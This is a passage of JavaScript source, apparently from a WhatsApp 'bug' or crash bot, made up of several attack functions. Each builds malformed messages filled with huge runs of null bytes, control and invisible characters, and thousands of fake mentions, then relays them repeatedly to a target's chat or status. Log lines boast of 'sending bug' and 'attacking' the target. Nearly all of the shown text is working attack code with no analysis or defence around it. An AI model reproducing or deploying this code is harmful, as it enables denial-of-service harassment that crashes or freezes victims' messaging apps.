  }, {});

  await Abim.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}
async function tesfc(target) {
  try {
   const invisible = "\u2063".repeat(6000);
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: invisible, 
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0005".repeat(80000) },
                { name: "call_permission_request", buttonParamsJson: "\u0006".repeat(90080) },
                { name: "cta_url", buttonParamsJson: "\u0006".repeat(96000) },
                { name: "cta_call", buttonParamsJson: "\u0007".repeat(9900) },
                { name: "cta_copy", buttonParamsJson: "\u0003".repeat(8000) },
                { name: "cta_reminder", buttonParamsJson: "\u0003".repeat(76000) },
                { name: "cta_cancel_reminder", buttonParamsJson: "\u0003".repeat(95000) },
                { name: "address_message", buttonParamsJson: "\u0003".repeat(95000) },
                { name: "send_location", buttonParamsJson: "\u0005".repeat(98000) },
                { name: "quick_reply", buttonParamsJson: "\u0003".repeat(90050) },
                { name: "mpm", buttonParamsJson: "\u0003".repeat(97000) },
              ],
            },
          },
        },
      },
    };

    await Abim.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.error(err);
  }
}
async function Ghostwolf(target) {
  try {
    const message = {
      viewOnceMessage: {
        message: {
          groupStatusMentionMessage: {
            newsletterAdminInviteMessage: {
              newsletterJid: "1@newsletter",
              newsletterName: "XxX" + "ោ៝".repeat(20000),
              caption: "XxX" + "ꦾ".repeat(90000) + "ោ៝".repeat(90000),
              inviteExpiration: "999999999",
            },
          },
        },
      },
    };

    await Abim.relayMessage(target, message);
  } catch (err) {
    console.error("Error saat mengirim pesan:", err);
  }
}
async function AxGBlorr(target) {

const Bruh = {
 ephemeralMessage: {
            message: {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "「AxG」Blorr - Yanz X 𑜦𑜠".repeat(20000),
                                format: "DEFAULT",
                            },
                            contextInfo: {
                                mentionedJid: [
                                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 5000000) + "917267@s.whatsapp.net"),
                                ],
                                isForwarded: true,
                                forwadingScore: 999,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "696969696969@newsletter",
                                    serverMessageId: 1,
                                    newsletterName: "「AxG」",
                                }
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: "{}".repeat(30000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    }; 
   
 const Sisten = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
          title: "「AxG」 - Glorr Yanz",
            text: "「wolker」- attacking",
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  };
  
   const AxG = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };
  
  for (const msg of [AxG, Bruh, Sisten]) { 
   await Abim.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(`「Wolker」 - Is Now Sending Bug 🐉 To ${target} suksesfull`);
  }
  
}    
async function AxDrainbim(target) {

  const StikerYanz = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            title: "「AxG」 - Glorr Yanz",
            text: "「Abim」- attacking",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  };

  const mantap = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "「Abim」- clorot",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "\u0000".repeat(7000),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "\u0000".repeat(1000000),
              },
              {
                name: "mpm",
                buttonParamsJson: "\u0000".repeat(7000),
              },
              {
                name: "mpm",
                buttonParamsJson: "\u0000".repeat(7000),
              }
            ]
          }
        }
      }
    }
  };

  const lorr = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Abim- New Is Running",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "carousel_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "galaxy_message"
        }
      }
    }
  };

  const SubwaySurf = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };
  
  for (const msg of [StikerYanz, mantap, lorr, SubwaySurf]) {

     await Abim.relayMessage(
      "status@broadcast",
      msg.viewOnceMessage?.message ||
      msg.stickerMessage ||
      msg,
      {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  { tag: "to", attrs: { jid: target } }
                ]
              }
            ]
          }
        ]
      }
    );
  }

}
async function InvisibleVoc(target) {
const sarzz1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
          title: "WOLKER | Vocaloid Trash",
            text: "ABIM IS HERE",
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});

const sarzz2 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };
  
  for (const msg of [sarzz1, sarzz2]) {
    await Abim.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(`Wolker Sending Bug To Delay ${target} suksesfull`);
  }
}
async function OtaxAyunBeloved(otax, target, mention) {

  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " ¿WOLKER GACOR¿ ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
 
  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ]

  let sequentialIndex = 0
  console.log(chalk.red(`𝘴𝘦𝘥𝘢𝘯𝘨 𝘮𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘢𝘵𝘵𝘢𝘤𝘬 𝘬𝘦 ${target}`))

  const selectedMedia = mediaData[sequentialIndex]
  sequentialIndex = (sequentialIndex + 1) % mediaData.length
  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
    ],
  }

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }

  const textMsg = {
    extendedTextMessage: {
      text: "Hi Im Otax?¿" + "ꦽ".repeat(300000),
      contextInfo,
    },
  }

  const interMsg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }

  const statusMessages = [stickerMsg, textMsg, interMsg]
 
  const musicMeta = {
  musicContentMediaId: "589608164114571",
  songId: "870166291800508",
  author: "οταϰ ιѕ нєяє",
  title: "нαι ιм οταϰ",
  artworkDirectPath:
    "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
  artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
  artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
  artistAttribution: "https://www.instagram.com/Otapengenkawin",
  countryBlocklist: true,
  isExplicit: true,
  artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
};

const videoMessage = {
  url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
  mimetype: "video/mp4",
  fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
  fileLength: "289511",
  seconds: 15,
  mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
  caption: "ԾԵԹՃ ՇԾՐe",
  height: 640,
  width: 640,
  contextInfo: {
    mentionedJid: Array.from(
      { length: 1900 },
      () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
    ),
  },
  annotations: [
    { embeddedContent: { embeddedMusic: musicMeta }, embeddedAction: true },
  ],
};

const stickMessage = {
  stickerMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
    mimetype: "image/webp",
    isAnimated: true,
    contextInfo: {
      mentionedJid: Array.from(
        { length: 2000 },
        () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
      ),
    },
  },
};

const nativeMessage = {
  interactiveResponseMessage: {
    body: { text: "๏tคץ ς๏гє", format: "DEFAULT" },
    nativeFlowResponseMessage: {
      name: "galaxy_message",
      paramsJson: "\u0000".repeat(1045000),
      version: 3,
    },
    entryPointConversionSource: "{}",
  },
  contextInfo: {
    participant: target,
    mentionedJid: Array.from(
      { length: 2000 },
      () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    ),
    quotedMessage: {
      paymentInviteMessage: {
        serviceType: 3,
        expiryTimestamp: Date.now() + 1814400000,
      },
    },
  },
};


const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const otaxmsg = generateWAMessageFromContent(target, generateMessage, {});

   
  const messages = [
  { viewOnceMessage: { message: { videoMessage } } },
  { viewOnceMessage: { message: stickMessage } },
  { viewOnceMessage: { message: nativeMessage } },
  { viewOnceMessage: { message: { musicMeta } } },
];

  let msg = null;
  for (let i = 0; i < 100; i++) {
  await Abim.relayMessage("status@broadcast", otaxmsg.message, {
        messageId: otaxmsg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });    
    await Abim.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
     for (const content of statusMessages) {
      const msg = generateWAMessageFromContent(target, content, {})
      await Abim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      })
    }
    for (const item of messages) {
      msg = generateWAMessageFromContent(target, item, {});
      await Abim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });
    }
        
    if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
  }
  if (mention) {
    await Abim.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " meki - melar ",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}
async function YxGAntiomek(target) {
    let GloryYanz = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "ABIM - ANTI GEDOR  🐉",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, 
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );
  let Garx = {
  stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };
    let jangan = {
    ephemeralMessage: {
            message: {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "𑜦𑜠".repeat(20000),
                                format: "DEFAULT",
                            },
                            contextInfo: {
                                mentionedJid: [
                                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 5000000) + "917267@s.whatsapp.net"),
                                ],
                                isForwarded: true,
                                forwadingScore: 999,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "696969696969@newsletter",
                                    serverMessageId: 1,
                                    newsletterName: "pinjem ven",
                                }
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: "{}".repeat(30000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    }; 
    
    await Abim.relayMessage("status@broadcast", GloryYanz.Message, {
        messageId: YxGAnti.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    await Abim.relayMessage("status@broadcast", Garx.message, {
        messageId: YxGAnti.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });
    await Abim.relayMessage("status@broadcast", jangan.message, {
        messageId: YxGAnti.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });
    console.log(chalk.red(`「WOLKER」- BY ABIM 🔥 Succes Sending Bug Delay To ${target}`));
}
async function StickersAbimZ(target) {
  try {
    const abimsalsa = "\u2063".repeat(5000);
    const salsa = "\u300B".repeat(3000);

    const msg1 = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "ABIM - ANTI GEDOR",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(55900),
              version: 3
            }
          }
        }
      }
    };

    const msg2 = {  
      stickerMessage: {  
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",  
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",  
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",  
        mimetype: "image/webp",  
        height: 9999,  
        width: 9999,  
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileLength: 12260,  
        mediaKeyTimestamp: "1743832131",  
        isAnimated: false,  
        stickerSentTs: "X",  
        isAvatar: false,  
        isAiSticker: false,  
        isLottie: false,  
        contextInfo: {  
          mentionedJid: [
            "0@s.whatsapp.net",  
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )  
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };

    const msg3 = {  
      viewOnceMessage: {  
        message: {  
          interactiveMessage: {  
            body: {  
              xternalAdReply: {  
                title: "Abimofficial",  
                text: abimsalsa  
              }  
            },  
            extendedTextMessage: {  
              text: "{".repeat(9000),  
              contextInfo: {  
                mentionedJid: Array.from(
                  { length: 2000 },
                  (_, i) => `1${i}@s.whatsapp.net`
                )
              }  
            },  
            businessMessageForwardInfo: {  
              businessOwnerJid: "13135550002@s.whatsapp.net"  
            },  
            nativeFlowMessage: {  
              buttons: [  
                { name: "view_product", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "address_message", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
